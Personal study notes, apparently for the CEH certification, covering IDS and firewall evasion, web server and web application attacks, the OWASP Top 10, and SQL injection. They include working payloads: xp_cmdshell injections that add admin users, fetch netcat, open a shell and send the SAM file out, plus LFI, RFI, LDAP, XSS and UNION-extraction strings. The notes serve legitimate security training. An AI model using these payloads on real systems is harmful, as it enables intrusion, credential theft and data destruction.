+	
+IPSec
+	- layer 3
+	- protocol suite developed by the IETF for security IP communications by authenticating and encrypting each IP packet of a communication session
+	- is deployed widely to implement VPNs and for remote user access through dialup connection to private nets
+	
+Components:
+	- IPsec Driver
+	- Internet Key Exchange (IKE)
+	- Internet Security Association Key Management Protocol
+	- Oakley
+	- IPsec Policy Agent
+	
+Benefits:
+	- Network-level peer authentication
+	- Data origin authentication
+	- Data integrity
+	- Data confidentiality (encryption)
+	- Replay protection
+
+Uses two modes:
+1. Transport Mode
+	- leaves the IP header in tact but encrypts the transport data
+	- for internal networks
+		Two Protocols:
+		1. AH Protocol
+			- gives Authentication
+		2. ESP Protocol
+			- gives encryption & autentication
+2. Tunnel Mode
+	- encapsules the packet inside another packet 
+	- for public networks
+
+Bettercap (linux) is a dandy util!
+bettercap -iface eth0
+
+
+===========================================================
+
+MODULE 12
+
+How an IDS detects an intrustion:
+	Signature Recognition
+		- also known as misuse detection tries to identify events that indicate an abuse of a system or network resource
+	Anomaly Detection
+		- detects the intrusion based on the fixed behavioral characteristics of the users and components in a computer system
+	Protocol Anomaly Detection
+		- models are built to explore anomalies in the way in which vendors deploy the TCP/IP specification
+
+Types of IDS:
+		1. Network Based
+			- systems typically consist of a black box that is placed on the network in a promisuous mode listening for patterns indicative of an intrusion
+			- detects malicious activity such as DOS attacks, port scans and attempts to crack into computers by monitoring network traffic
+		2. Host-based IDS
+			- systems usually include auditing for events that occur on a specific host
+			- not as common due to the overhead they incur by having the monitor each system event
+
+Types of IDS Alerts
+1. True Positive (Attack alert) : raises alarm when legitimate attack occurs
+2. False Positive (no attack alert) : alarm when no attack has taken place
+3. False negative (attack no alert) : does not raise alarm when legitimate attack has taken place
+4. True Negative (no attack no alert) : does not raise alarm when an attack has not taken place
+
+Intrusion Prevention System 
+	- also called active IDS since it's capable of not only detectng the intrusons but also preventing them
+	- is a continuous monitoring system that often sits behind the firewalls as an additional layer of protection
+	- unlike IDS, which is passive, IPS is place IN LINE on the network between the source and destination to actively analyze the network traffic and to automatically take decisions on the traffic that is entering the network
+	
+Insertion Attack
+	- process by which the attacker confuses the IDS by forcing it to read invalid packets
+	- an IDS blindly believes and accepts a packet that an end system rejects and the attacker exploits this condition and inserts data into the IDS
+	- attack occurs when the NIDS is less strict in processing packets than the internal network
+	- the attacker obscures extra traffic and the IDS concludes that the traffic is harmless. Hence the IDS gets more packets than the destination
+	- the attackers sends one-character packets to the target system via the IDS with varying TTL such that some packets reach the IDS but not the target system
+
+Evasion
+	- an end system accepts a packet that an IDS rejects
+	- using this technique an attacker exploits the host computer without the IDS ever realizing it
+	- the attacker sends portions of the request in packets that the IDS mistakenly rejects, allowing the removal of parts of the stream from the IDS
+	- for example, if the malicious sequence is sent byte-by-byte and one byte is rejected by the IDS then the IDS cannot detect the attack
+	- here the IDS gets fewer packets than the destination
+	 
+Obfuscating and False Positive Generation
+	Obfuscating
+		- used by attackers who encode the attack packet payload in such a way that the destination host can decode the packet but not the IDS
+		- attackers manipulate the path referenced in the signature to fool the HIDS
+		- attackers can encode attack patterns in unicode to bypass IDS filters but be understood by an IIS web server
+		- Polymorphic code is another means to circumvent signature based IDSs by creating different attack patterns so that the attack does not have just one unique detectable signature
+		- attacks on ecnrypted protocols such as HTTPS are obfuscated if the attack is encrypted
+	False Positive Generation
+		- attackers with knowledge of the target IDS craft malicious packets just to generate alerts
+		- these packets are sent to the IDS to generate many false positive alerts
+		- attackers then use these false positive alerts to hide the real attack traffic
+		- attackers can bypass the IDS unnoticed as it is diffucult to differentiate the attack traffic from the large volume of false positives
+	
+Session Splicing
+	- a technique used to bypass the IDS where an attacker splits the attack traffice into many packets such that no single packet triggers the IDS
+	- it is effective against IDS that do not reconstruct packets before checking them against intrusion detection signatures
+	- if attackers are aware of a delay in packet reassembly at the IDS they can add delays between packet transmissions to bypass the reassembly
+	- many IDSs stop reassembly if they do not receive packets within a certain time
+	- IDS will stop working if the target host keeps the session active for a time longer than the IDS reassembly time
+	- any attack attempt after a successful splicing attack will not be logged by the IDS
+
+Unicode Evasion Technique
+	- unicode is a character coding system to support the worldwide interchange, processing and display of written texts
+	- in the unicode code spare, all the code points are treated differently but it is possible that there could be multiple representations of a single character
+	- because of this complexity, some IDS systems handle unicode improperly as unicode allows multiple interpretations of the same characters
+	- taking this as an advantage, attackers can convert attack strings to unicode characters to avoid pattern and signature matching at the IDS
+	
+Firewall Evasion Techniques:
+1. Firewaling
+2. Banner Grabbing
+3. IP Address Spoofing
+4. Source Routing
+5. Tiny Fragments
+6. Using an IP address in the place of a URL
+7. Using a proxy server
+8. ICMP tunneling
+9. ACK tunneling and HTTP tunneling
+10. SSH and DNS tunneling
+11. Through external systems
+12. Through MITM attack
+13. Through content and XSS attack
+14. Through HTML smuggling
+15. Through Windows BITS
+
+
+===================================================================================
+
+
+Module 13: Hacking Web Servers
+
+Ways Web Servers are compromised:
+	- improper file and directory permissions
+	- server installation with default settings
+	- enabling unnecessary services including content management and remote administration
+	- security conflicts with business ease-of-use case
+	- lack of proper security policies, procedures and maintenance
+	- improper authentication with external systems
+	- default accounts having default passwords or no passwords
+	- unnecessary default, backup or sample files
+	- misconfigurations in the web server, OS and network
+	- bugs in server software, OS and web apps
+	- misconfigured SSL certificates and encryption settings
+	- administrative or debugging functions that are enabled or accessible on web servers
+	- use of self-signed certificates and default certificates
+	- not using dedicated server for web services
+	
+PRINCIPLE OF LEAST PRIVILAGE ALWAYS
+
+Directory Traversal Attack
+	- attackers use the ../ sequence to access restricted directories outside the web root
+	- attackers can use trial and error method to navigate outside the root directory and access sensitive information in the system
+		- /..%c0%af../winnt/system32
+			- uses unicode to sneak the slash past the server
+			
+HTTP Response-Splitting Attack
+	- involves adding header response data into the input field so that the server splits the response into two responses
+	- the attacker can control the first response to redirect the user to a malicious website whereas the other responses are discarded by the web browser
+	- this is vulnerable because it's been offloaded as client-side validation
+	- serverside is more secure but uses more server resources
+	
+Web Cache Poisoning Attack
+	- attacks the reliability of an intermediate web cache source
+	- the attackers swap cached content for a random URL with infected content
+	- users of the web cache source can unknowingly use the poisoned content instead of the true and secured content when requesting the required URL through the web cache
+	- it's like writing a post dated cheque
+
+SSH Brute Force Attack
+	- attackers can brute force SSH login creds
+	
+Web Server Password Cracking
+	- an attacker tries to exploit weaknesses to hack well-chosen passwords
+	- most common passwords are password, root, administrator, admin, demo, test, guest, qwerty, etc
+	- tools: brutus (win)
+
+Enumerating Web Server Information with Nmap
+	# nmap -sV -O -p 10.10.10.23
+	# nmap -sV --script=http-enum 10.10.10.23
+	# nmap 10.10.10.23 -p 80 --script=http-frontpage-login
+	# nmap --script http-passwd --script-args http-passwd.root =/ 10.10.10.23
+	# nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostnamp- www.target.com
+	# nmap --script http-trace -d www.target.com
+	# nmap -p 80 --script http-waf-detect www.target.com    (checks if it's being monitored by IDS/IPS probes and checks responses)
+	
+	
+Patch Management
+	- a process used to fix known vulnerabilities by ensuring that the appropriate patches are installed on a system
+	1. Detect: use tools to detect missing security patches
+	2. Assess: assess the issues and associated severities by mitigating the factors that may influence the decision
+	3. Acquire: download the patch for testing
+	4. Test: install the patch first on a testing machine to verify the consequences of the update
+	5. Deploy: deploy the patch to the computers and ensure that the applications are not affected
+	6. Maintain: subscribe to get notifications about vulnerabilities as they get detected
+	
+Tool: linux: ghosteye
+	- pulls whois and dns and header grabber etc
+	- detects clickjacking vulnerabillity, nmap and robots.txt
+	
+To use netcat to grab a banner
+# nc -vv target.com 80
+	-then type: 
+	GET / HTTP/1.0
+		- this gives you content type, modified date, server info and version
+		- can do the same thing with telnet
+
+
+
+===================================================================================
+
+
+MODULE 14: Hacking Web Applications
+
+Web Services:
+	- a web services is an application that is deployed over the internet and uses standard messaging protocols such as SOAP, UDDI, WSDL, and REST to enable communication between applications developed for different platforms
+	- SOAP web services: based on the XML format and is used to transfer data between a service provider and requestor
+	- RESTful web services: based on a set of constraints using underlying HTTP concepts to improve performance
+
+Countering web service attacks: Sanitizing your inputs!
+
+OWASP Top 10 Application Security Risks (2021): (Open Web Applications Security Project)
+	A01: Broken Access Control
+	A02: Cryptographic Failures
+		- many web apps do not properly protect their sensitive data from unauthorized users
+		- when an app uses poorly written encryption code to securely encrypt and store sensitive data in the database, an attacker can exploit this flaw and steal or modify weakly protected sensitive data (CCs, SSNs, authentication creds)
+	A03: Injection
+		- allows untrusted data to be interpreted and executed as part of a command or query
+		- attackers exploit injection flaws by constructing malicious commands or queries that result in data loss or corruption, etc
+		- prevalent in legacy code, often found in SQL, LDAP, XPath etc and can be easily discovered by application vulnerability scanners and fuzzers
+			SQL Injection: injects malicious SQL queries into user input forms
+			Command Injection: injects malicious code through a web app
+			LDAP Injection: injects malicious LDAP statements
+			Cross-Site Scripting (XSS): injection and execution of malicious scripts in the browser
+	A04: Insecure Design
+	A05: Security Misconfigurations
+		- by exploiting misconfiguration vulnerabilities such as unvalidated inputs, parameter/form tampering, improper error handling and insufficient transport layer protection, attackers gain unauthorized access to default accounts, read unused pages, read/write unprotected files and directories, etc
+		- security misconfiguration can occur at any level of an application stack including platform, web server, application server, framework, and custom code
+			1. Unvalidated Inputs: refers to a web app vuln in which the input from a client is not validated before being processed by web apps and backend servers
+			2. Parameter/Form Tampering: involves the manipulation of parameters exchanged between the client and server to modify application data
+			3. Improper Error Handling: provides insight into source code such as logic flaws and default accounts. Using the information received from an error message an attacker identifies vulns to launch various web app attacks
+			4. Insufficient Transport Layer Protection: it supports weak algorithms and uses expired or invalid certificates. Using insufficient transport layer protection exposes user data to untrusted third parties and can lead to account theft
+			5. Improper Restriction of XXE: discloses internal files using the file URI handler, internal SMB file shares on unpatched Windows servers, internal port scanning, RCE and DOS attacks
+	A06: Vulnerable and Outdated Components
+		- most web apps that use components such as libraries and frameworks always execute them with full privs and flaws in any component can result in serious impact
+		- attackers can identify weak components or dependencies by scanning or by performing manual analysis
+		- attackers search for any vulns on exploit sites such as exploit-db.com and cxsecurity.com
+		- if a vulnerable component is identified the attacker customizes the exploit as required and executes the attack
+		- successful exploitation allows the attacker to cause serious data loss or take full control of theservers	
+	A07: Identification and Authentication Failures
+		- attackers can exploit vulns in identification, authentication or session management functions such as exposed accounts, session IDs, logout, password management, timeouts, remember me, secret question and account update to impersonate users
+			Session ID in URLs: attackers sniff the network traffic or trick users to get session IDs then reuse those session IDs for malicious purposes
+				EG; http://certifiedhackershop.com/sale/saleitems=304;jsessionid=12MTOIDPXM0OQSABGCKLHCJUN2JV?dest=NewMexico
+			Password Exploitation: attackers gain access to a web apps password database; if user PWs are not encrypted the attacker can exploit any user's PW
+			Timeout Exploitation: if an app timeouts are not set properly and a user closes their browser without logging out from sites accessed through a public computer, an attacker can use the same browser later and exploit that user's privs.
+	A08: Software and Data Integrity Failures
+	A09: Security Logging and Monitoring Failures
+		- web apps maintain logs to track usage patters such as user and admin login credentials
+		- security logging and monitoring failures cover application weaknesses such as
+			- insufficient logging
+			- improper output neutralization for logs
+			- exclusion of security-relevant information
+			- addition of sensitive information to log files
+		- insufficient logging and monitoring refer to the scenario where the detection software either does not record the malicious event or ignores important details about the event
+		- attackers usually inject, delete or tamper the web app logs to engage in malicious activities or to hide their identities
+	A10: Server Side Request Forgery
+		- attackers exploit SSRF vulnerabilities in a public web server to send crafted requests to the internal or backend servers
+		- once the attack is successful the attackers can perform various activities such as port scanning, network scanning, IP address discovery, reading web server files and bypassing host-based authentication
+
+Other Web Application Threats
+	1. Directory Traversal
+	2. Unvalidated Redirects and forwards
+			- enables attackers to install malware or trick victims into disclosing passwords or other sensitive information 
+		- unsafe forwards may allow access control to be bypassed
+	3. Watering Hole Attack
+		- attacker identifies the kinds of websites a target frequently surfs and tests those particular websites to dientify possible vulns
+		- when one is found the attacker injects malicious script/code into the web app that can redirect the webpage and download malware to the victim
+	4. Cross Site Request Forgery (CSRF)
+		- exploit web page vulns that allow an attacker to force an unsuspecting user's browser to send malicious requests they did not intend
+		- the victim holds an active session with a trusted site and simultaneously visits a malicious site which injects an HTTP request for the trusted site into the victim's user session
+	5. Cooking/Session Poisoning
+		- cookies are used to maintain a session state in the otherwise stateless HTTP protocol
+		- modify the cookie content
+		- inject the malicious content
+		- rewriting the session data: a proxy can be used for rewriting the session data, displaying the cookie data, and/or specifying a new user ID or other session identifiers in the cookie
+	6. Web Service Attacks
+	7. Cookie Snooping
+	8. Hidden Field Manipulation
+		- when a user makes selections on an HTML page the selection is typically stored as form field values and sent to the application as an HTTP request (GET or POST)
+		- HTML can also store field values as hidden fields which are not rendered to the screen by the browser but are instead collected and submitted as parameters during form submissions
+		- attackers can examine the HTML code of a page and change the hidden field values to change post requests to the server
+	9. Obfuscation Applications
+	10. Denial of service
+	11. Buffer Overflow
+	12. CAPTCHA attacks
+	13. Platform Exploits
+	14. Network Access Attacks
+	15. DMZ Protocol Attacks
+	16. Web-based Timing Attacks
+	17. MarioNet Attack
+	18. RC4 NOMORE attack
+	19. Clickjacking Attack
+		- tricking the victim into clicking on any malicious web page element that is placed transparently on top of any trusted web page
+		- is not a single technique but a variety of attack vectors called UI redress attacks
+		- performed by exploiting the vulnerabilities caused by HTML iframes or improper configuration of the X-Frame-Options header
+	20. JavaScript Hijacking
+	21. DNS Rebinding Attack
+	22. Same-Site Attack
+	23. Pass-the-cookie attack
+		- occurs when attackers obtain a clone of a cookie from the user's browser and uses the cookie to establish a session with the target web server	
+Unvalidated Redirects and Forwards
+
+Footprint Web Infrastructure: Detecting Web App Firewalls and Proxies on Target Site
+	Detecting Proxies
+		- determine whether your target is routing your requests through any proxy servers
+		- proxies generally add certain headers in the response header field
+		- use HTTP/1.1 TRACE method to identify any changes that a proxy server made to the request
+	Detecting Web App Firewalls (WAFs)
+		- check the cookies response to your request because most of the WAFs add their own cookie in the response
+		- Tool: wafw00f (linux) to find which WAF is running in front of the application
+	Detecting Load Balancers
+		- orgs use load balancers to distribute web server load on multiple servers and increase the productivity and reliability of web apps
+		- attackers can use tools like dig, load balancing detector (lbd) and Halberd to detect load balancers and their real IP addresses
+		
+Analyze Web Applications
+	Identify Entry Points for User Input
+			- review the generated HTTP request to identify the user input entry points
+			- examine any URL, HTTP header, query string parameters, POST data and cookies to determine all user input fiends
+			- identify HTTP header parameters that can be processed by the application as user inputs such as User-Agent, Referer, Accept, Accept-Language and Host headers
+			- determine URL encoding techniques and other encryption measures implemented for secure web traffic such as SSL
+	Identify Server-Side Technologies
+		- fingerprint the technologies active on the server using various fingerprint techniques such as HTTP fingerprinting
+		- performe detailed server fingerprinting, analyze HTTP headers and HTML source code to identify server-side technologies
+		- examine URLs for file extensions, directories and other identification information
+		- examine the error page messages
+		- examine session tokens: 
+			- JSESSIONID (Java)
+			- ASPSESSIONID (IIS)
+			- ASP.NET_SessionId (ASP.NET)
+			- PHPSESSID (PHP)
+			- use tools such as httprint and WhatWeb to identify server-side technologies
+	Identify Server-Side Functionality
+		- observe the applications revealed to the client to identify the server-side structure and functionality
+	Identify Files and Directories
+		- identify misconfigured web applications that expose critical files and directories over the internet
+	Identify Web Application Vulnerabilities
+		- identify exploitable vulnerabilities in the underlying web technologies
+		- tool: Vega, WPScan, Arachni, appspider, uniscan
+	Map the Attack Surface
+		- identify the various attack surfaces uncovered by the applications and their associated vulnerabilities
+		
+Bypass Client-Side Controls
+	- a web app requires client-side controls to prevent user inputs from affecting data transmission via client components and ti implement measures that control a user's interaction with his or her own client
+	- web devs often think that the data transmitted from the client to server is under control by the user and this assumption can make applications vulnerable
+		Attack Hidden Form Fields:
+			- identify hidden form fields in a page and manipulate its tags and fields to exploit the web page before it transmits data to the server
+		Attack Browser Extensions:
+			- attempt to interfect the traffic from browser extensions or decompile the browser extensions to capture user data
+		Perform Source Code Review
+			- identify vulnerabilities in the code that cannot be identified by traditional vuln scanning tools
+		Evade XSS Filters
+			- inject unusual characters into the HTML code
+			
+Attack Authentication Machanism
+	- exploit design and implementation flaws in web applications such as failure to check password strength or insecure transmission of credentials to bypass authentication mechanisms
+		Username Enumeration
+			- verbose failure messages
+			- predictable usernames
+		Cookie Exploitation
+			- cookie poisoning
+			- cookie sniffing
+			- cookie replay
+		Password Attacks
+			- password functionality exploits
+			- password guessing
+			- brute-force attacks
+			- dictionary attacks
+			- password reset mechanism
+		Session Attacks
+			- session prediction
+			- session brute-forcing
+			- session poisoning
+		Bypass Authentication
+			- bypass SAML-based SSO
+			
+HTTP Request Tampering
+	Query String Tampering
+		- if the query string is visible in the address bar of the browser then try to change the string aprameters to bypass authorization mechanisms
+		- use web spidering tools such as Burp to scan the web app for POST parameters
+	HTTP Headers
+		- if the app uses the referer header for making access control decisions then try to modify it to access application functionalities
+
+Local File Inclusion (LFI)
+	- LFI vulns enable attackers to add their own files on a server via a web browser
+	- occurs when an app adds files without proper validation of inputs thereby enabling the attacker to modify the input and embed path traversal characters
+		Evade added .php and other extensions of the file
+		- file exntensions are added using PHP code:
+			$file =  $_GET['page'];
+			require($file.".php");
+		- if an attacker tries to insert null-byte (%00) to end of attack string the .php can be easily evaded
+			http://xyz.com/page=../../../../../../etc/passwd%00
+		- another method to evade the added php is to add a question mark on the attack string
+			http://xyz.com/page=../../../../../../etc/passwd?
+		- a LFI vuln can read .txt files but not .php files because .php files get executed by the server and its file ending compromises some code
+		- evade .php by using a built-in php filter:
+			http://xyz.com/index.php?page=php://filter/convert.base64-encode/resource=index
+			
+Attack Shared Environments
+	- orgs leverage third party service providers for hosting and maintaining their web apps and relevant web infrastructure
+	- for example a malicious client of the service provider may try to compromise the security of another organization's web app or a client may deploy a vulnerable web app that exposes and compromises the web apps of other orgs
+		Attacks on the access mechanism:
+			- orgs use an administrative web interface for configuring and managing web apps from a remote location
+			- check whether the remote access mechanism has any unpatched vulns or config errors that can be exploited
+			- check whether the access privs are properly separated between clients
+		Attacks between apps
+			- vulns existing in one web app may allow attackers to execute malicious script and compromise the security of other hosted web apps
+			- EG an SQL injection vuln in one app may allow attackers to run arbitrary SQL commands and queries to retrieve data in the shared environment
+
+Connection Pool DoS
+	- examine the connection pooling settings of the application, construct a large malicious SQL query and run multiple queries siumultaneously to consume all connections in the connection pool causing DB queries to fail for legit users
+		EG: in ASP.NET the default maximum allowed connections in the pool are 100 and the timeout is 30 seconds
+			- therefor run 100 multiple queries each within an execution time of 30+ seconds within 30 seconds to cause a connection pool DOS to prevent others from being able to use the database-related parts of the application
+		
+Web API
+	- is an application programming interface that provides online web services to client-side apps for retrieving and updating data from multiple online sources
+	- using a decentralized web API reduces the complexity and increases the integrity of updating and changing the data or business logic at one central location
+		SOAP API: 
+			- web based communication protocol that enables interactions between apps running on different platforms
+			- SOAP-based APIs are programmed to generate, recover, modify and erase different logs such as profiles, credentials and business leads
+		REST API:
+			- rest is not a specification, too, or framework but instead is an architectural style for web services that serves as a communication medium between various systems on the web
+			- APIs which are supported by the REST architectural style are known as REST APIs
+		RESTful API:
+			- aka RESTful services are designed using REST principles and HTTP communication protocols
+			- RESTful is a collection of resources that use HTTP methods such as PUT, POST, GET, and DELETE
+		XML-RPC:
+			- is a protocol uses a specific XML format to transfer data
+			- is simpler than SOAP and uses comparatively less bandwidth to transfer data
+		JSON-RPC:
+			- a protocol that is similar to XML-RPC but it uses JSON format instead of XML to transfer data
+	
+Webhooks
+	- are user-defined HTTP callback or push APIs that are raised based on events triggered such as receiving a comment on a post or pushing code into the registry
+	- webhooks allow applications to update other applications with the latest information
+	- are enrolled along with the domain registration via user interface or API to inform clients about the occurence of a new event
+
+Login/Credential Stuffing Attacks
+	- exploit password reuse across multiple platforms
+	- credential stuffing attacks do not perform guessing or brute-forcing of passwords
+		- attackers try to automate all the earlier identified pairs of credentials using automated tools such as Sentry MBA and PhantomJS to break in
+		
+Web Application Fuzz Testing
+	- fuzzing is a black-box testing method
+	- is a quality checking and assurance technique used to identify coding errors and security loopholes in web apps
+	- huge amounts of random data (called "fuzz") will be generated by the fuzzers and used against the target web app to discover vulns that can be exploited
+	- employ this technique to test the robustness and immunity of the developed web application against attacks like buffer overflow, DOS, XSS and SQL injection
+	
+Encoding Schemes
+	- web apps employ different encoding schemes for their data to safely handle unusual characters and binary data in the way you intend
+		URL Encoding
+			- converts URL into valie ASCII format so the data can be safely transported over HTTP
+			- uses "%" followed by the character's two-digit ASCII code expressed in hex
+				%3d = 
+				%0a new line
+				%20 space
+		HTML Encoding
+			- defines several HTML entities to represent unusual characters
+			&amp; &
+			&lt; <
+			&gt; >
+		Unicode Encoding
+			- 16bit unicode represents unusual characters with "%u" followed by the character's unicode point expressed in hex
+			&u2215 /
+		UTF-8
+			- is a variable-length encoding standard that uses each byte expressed in hex and preceded by the % prefix
+			%c2%a9 (copyright)
+			%e2%89%a0 (space)
+		Base64 Encoding
+			- represents any binary data using only printable ASCII characters
+			- usually used for encoding email attachments for safe transmission over SMTP ut also used for encoding user creds
+		Hex Encoding
+			- the HTML encoding scheme uses the hex value of every character to represent a collection of characters for transmitting binary data
+				Hello = A125C458D8
+				Jason = 123B684AD9
+				
+Whitelisting & Blacklisting Applications
+	Whitelisting (Implicit Deny)
+		- contains a list of applications such as software libraries, plugins, extensions and configuration files which can be permitted to execute in the system
+		- helps in preventing the unauthorized execution and spreading of malicious programs
+		- whitelisting avoids the installation of unapproved vulnerable applications
+		- whitelisting provides greater flexibility by providing protection against ransomware or malware attacks
+	Blacklisting (Implicit Allow)
+		- contains a list of malicious applications that are not permitted
+		- is a threat-centric method as it cannot detect modern threats and results in attacks that lead to data loss
+		- it is important to regularly update the blacklist for protection against the latest threats
+
+Web Application Security Testing Tools
+	- BeEF (Browser Exploitation Framework)
+	- metasploit
+	- powersploit
+	- watcher
+	- invicti
+	- arachni
+
+Testing Input Sanitization: throw a single quote (') into an input field, if it throws  an OBDC error then it's not
+	' OR 1=1 
+	' or 1=1--
+		- can bypass authentication
+		
+Command Injection Attacks
+	Shell Injection
+		- an attacker tries to craft an input string to gain shell access to a web server
+		- shell injection functions include:
+			system()
+			StartProcess()
+			java.lang.Runtime.exec()
+			System.Diagnostics.Process.Start()
+			... and other API commands
+	HTML Embedding
+		- used to deface websites virtually
+		- attacker adds extra HTML-based content to the vulnerable web app
+		- a user adds input to a web script that is then used in the output HTML without being checkd for HTML code or scripting
+	File Injection
+		- used to inject malicious code into system files
+		http://certifiedhacker.com/vulnerable.php?COLOR=http://evilhacker.com/exploit? 
+	LDAP Injection
+		- LDAP directory services store and organize information based on its attributes
+			- the info is hierarchically organized as a tree of directory entries
+		- based on the client-server model and clients can search through directory entries using filters
+		- LDAP injection attacks are similar to SQL attacks but exploit user parameters to generate an LDAP query
+		- LDAP injection techniques take advantage of non-validated web application input vulnerabilities and pass LDAP filters used for searching Directory Services to obtain direct access to databases behind the LDAP tree
+		- to test if an app is vulnerable to LDAP code injection send a query to the server that generates an invalid input
+			- if the server returns an error it can be exploited with code injection techniques
+		EG: attacker enters valid username "certifiedhacker" and injects 
+				certifiedhacker)(&))
+			.. then the url string becomes:
+				(&(USER=certifiedhacker)&))(PASS=blah))
+			Then only the first filter is processed by the LDAP server, so it only processes
+				(&(USER=certifiedhacker)(&))
+			This query is always true and therefor the attacker can log into the system without a valid password
+	Cross-Site Scripting (XSS) Attacks
+		- exploit vulnerabilities in dynamically generated web pages enabling malicious attackers to inject client-side scripts into web pages viewed by other users
+		- occurs when unvalidated input data is included in dynamic content that is sent to a user's web browser for rendering
+		- attackers inject malicious JavaScript, VBScript, ActiveX, HTML or FLASH for execution on a victim's system by hiding it within legitimate requests
+		- some XSS attack exploits include malicious script execution, redirecting to a malicious server, exploiting user privs, ads in hidden IFRAMEs and pop-ups, data manipulation, etc.
+		NOTE: CEH Tools Module 14 has XSS cheat sheet
+		EG: in a "Leave a message" window:
+			<script>alert("Hello XSS!")</script>
+
+Using nmap for Web App recon (use root)
+	# nmap -T4 -A -v target.com    (will take about 10 min)
+	
+Web Spidering with OWASP Zap (use root)
+	# zaproxy    (will launch the gui)
+	
+Brute Forcing can be done with Burpsuite!
+
+Labnotes on Performing Cross-Site Request Forgery (CSRF) 
+	- login to wordpress
+	- add leenk.me plugin
+	- add facebook
+	- update message settings
+	- register for wpscan.com and get API token from "How it works" > Get Started
+	- launch wpscan:
+		wpscan --api-token HFGhfehpifeHHEF --url http://target.site:8080/wp-login --plugins-detection aggressive --enumerate vp
+		(takes 3 minish)
+	- can use "security script" from CEH folder 
+	- open that in the same browser that is logged into wordpress
+	
+
+
+===================================================================================
+
+
+MODULE 15: SQL Injection
+
+What is SQL Injection?
+	- technique used to take advantage of un-sanitized input vulnerabilities to pass SQL commands through a web application for execution by a backend database
+	- is a basic attack used to either gain unauthorized access to a DB or retrieve information directly from the db
+	- is a flaw in web applications and not a database or webserver issue
+	
+Samples to throw into an input field:
+	';create database hacker;--
+	';exec master..xp_cmdshell "net user hacker hack /add";--
+	';exec master..xp_cmdshell "net localgroup administrators hacker /add";--
+	';exec master..xp_cmdshell "tftp -i 192.168.1.100 GET nc.exe";--
+	';exec master..xp_cmdshell "nc -l -p 79 -d -e cmd.exe";--
+	';exec master..xp_cmdshell "echo YOU ARE HACKED > c:\inetpub\wwwroot\default.htm";--
+	';exec master..xp_cmdshell "cmd.exe /c calc.exe";--
+	';use master;exec sp_makewebtask 'c:\inetpub\wwwroot\db.htm','select * from sysdatabases';--
+	';use coastalbanc;exec sp_makewebtask 'c:\inetpub\wwwroot\tab.htm','select * from sysobjects';--
+	';use coastalbanc;exec sp_makewebtask 'c:\inetpub\wwwroot\tab.htm','select * from userinfo';--
+	';use coastalbanc;exec sp_makewebtask 'c:\inetpub\wwwroot\tab.htm','select * from creditcard';--
+	';use master; drop database costalbanc;--
+	';exec master..xp_cmdshell "tftp -i 192.168.1.100 put c:\winnt\repair\sam sam";--
+	';shutdown with nowait;--
+
+
+Understanding HTTP POST Requests
+	- when a user provides information and clicks Submit, the browser submits a string to the web server containing the user's credentials
+	- this string is visible in the body of the HTTP or HTTPS POST request 
+	
+If you can see the error reply, it's non-blind
+If you can not see the error, it's blind
+
+Error Based SQL Injection
+	- forces the database to perform some operation in which the result will be an error
+	- this exploitation may differ depending on the DBMS
+		- consider the SQL query (Oracle 10g):
+			SELECT * FROM products WHERE id_product=$id_product
+		- Consider the following request to a script that executes the query above:
+			http://www.example.com/product.php?id=10
+		- the malicious request would be:
+			http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )-
+		- the tester concatenates the value 10 with the result of the function UTL_INADDR.GET_HOST_NAME
+		- this Oracle function will try to return the hostname of the parameter passed to it, which is another query, the name of the user
+		- when the db looks for a hostname with the user database name, it fails and returns an error message such as:
+			ORA-292257: host SCOTT unknown
+		- then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message
+
+Blind/Inferential SQL Injection
+	No Error Message
+		- used when a web app is vulnerable to SQL injection but the results of the injection are not visible to the attacker
+	Generic Page
+		- blind SQL injection is identical to a normal SQL injection except that a generic custom page is displayed when an attacker attempts to exploit an application rather than seeing a useful error message
+	Time-Intensive
+		- this type of attack can become time-intensive because a new statement must bew crafted for each bit recovered
+	SQL Map takes care of this
+	WAITFORDELAY (YES or NO response)
+		- since no error messages are returned we can use 'waitfor delay' command to check the SQL execution status
+			- WAITFOR DELAY 'time' (seconds
+				- just like sleep, wait for a specified time
+				WAITFOR DELAY '0:0:10'--
+			- BENCHMARK() (Minutes)
+				BENCHMARK(howmanytimes, do this)
+			- basically tell it "if I guess right, wait 10 seconds, if I guess wrong return the error right away"
+
+Out-of-Band SQL Injection
+	1. the attacker needs to communicate with the server and acquire features of the database server used by the web app
+	2. attackers use different communication channels to perform the attack and obtain the results
+	3. attackers use DNS and HTTP requests to retrieve data from the database server
+	4. for example, in Microsoft SQL Server, an attacker exploits the xp_dirtree command to send DNS requests to a server controlled by the attacker
+	"Out of band" just means when you get the error messages back but not through the same communications channel.
+
+Extracting Information through Error Messages
+	- error messages are essential for extracting information from the database
+	- they provide information about the operating system, database type, version, privilege level, OS interaction level, etc
+	- you can vary the attack technique depending upon the type of errors found
+	PARAMETER TAMPERING
+		- the attacker manipulates parameters of the GET and POST request to generate errors
+		- errors may give information such as database server name, directory structures and the functions used for the SQL query
+		- parameters can be tampered with directly from the address bar or using proxies
+	GROUPING ERROR
+		- having command allows us to further define a query based on the "grouped" fields
+		- the error message tells us which columns have not been grouped
+		' group by columnnames having 1=1 --
+	TYPE MISMATCH
+		- try to insert strings into numeric fields; the error messages will show the data that could not get converted
+	BLIND INJECTION
+		- use time delays or error signatures to determine or extract information
+		
+Perform Union SQL Injection
+	Extract Database Name
+		http://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1, DB_NAME,3,4--
+			[DB_NAME] Returned from the server
+	Extract Database Tables
+		https://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--
+			[EMPLOYEE_TABLE] Returned from the server
+	Extract Table Column Names
+		http://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name='EMPLOYEE_TABLE'--
+			[EMPLOYEE_NAME]
+	Extract 1st Field Data
+		http://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --
+			[FILED 1 VALUE] Returned from server
+			
+Perform Error Based SQL Injection
+	Extract Database Name
+		http://certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(DB_NAME))--
+			- syntax error converting the nvarchar value 'DB_NAME]' to a column of data type int
+	Extract 1st Table Column Name
